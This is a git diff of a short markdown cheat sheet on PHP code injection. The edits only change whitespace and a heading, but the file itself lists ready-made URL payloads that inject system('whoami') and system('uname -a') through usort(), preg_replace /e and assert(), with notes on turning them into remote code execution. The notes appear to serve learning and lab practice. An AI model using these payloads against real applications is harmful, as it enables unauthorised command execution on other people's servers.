@@ -10,12 +10,14 @@ Code Injection is the general term for attack types which consist of injecting c
 **payload**- " . hacker".system('uname -a');#       - change to RCE  & url encode need 
 
 
+
 ### example 2
 ` usort() - Sort an array by values using a user-defined comparison function `
 
 **payload**-example2.php?order=id,system('whoami')
 
 **payload**- example2.php?order=id);}system('whoami');#      - change to RCE  & url encode need 
+
 
 
 ### example 3
@@ -26,6 +28,7 @@ Code Injection is the general term for attack types which consist of injecting c
 **payload** - example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer         - change to RCE
 
 
+
 ### example 4
 ` assert() - Checks if assertion is FALSE `
 
@@ -34,8 +37,7 @@ Code Injection is the general term for attack types which consist of injecting c
 **payload** - example4.php?name=hacker'.system('uname -a').'
 
 
-
-###Noted by [konova](https://www.facebook.com/kon0va)
+### Noted by [konova](https://www.facebook.com/kon0va)
 
 
 ### Ref : 
